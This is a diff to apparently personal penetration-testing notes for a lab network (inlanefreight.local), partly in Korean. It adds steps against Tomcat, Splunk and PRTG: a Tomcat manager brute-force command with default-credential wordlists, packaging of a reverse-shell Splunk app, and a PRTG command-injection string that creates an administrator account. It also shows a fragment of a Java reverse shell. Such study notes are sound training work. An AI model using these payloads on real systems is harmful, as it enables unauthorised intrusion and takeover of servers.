@@ -158,7 +158,7 @@ curl -s http://app-dev.inlanefreight.local:8080/docs/ | grep Tomcat
 ```
 - `tomcat-users.xml`
 ```bash
-https://github.com/b33lz3bub-1/Tomcat-Manager-Bruteforce
+git clone https://github.com/b33lz3bub-1/Tomcat-Manager-Bruteforce
 
 python3 mgr_brute.py -U http://web01.inlanefreight.local:8180/ -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
 ```
@@ -191,11 +191,21 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 ```
 
 ## Splunk
+- `nmap` 스캔으로 발견됨.
 ```bash
-# Splunkd httpd
-sudo nmap -sV 10.129.201.50
-```
+git clone https://github.com/0xjpuff/reverse_shell_splunk
 
+tar -cvzf updater.tar.gz splunk_shell/
+```
+- `Apps > Install app from file`
+
+## PRTG Network Monitor
+- `nmap` 스캔으로 발견됨.
+- https://codewatch.org/2018/06/25/prtg-18-2-39-command-injection-vulnerability/
+- `setup > account settings > Notifications`
+```
+test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add
+```
 
 </details>
 
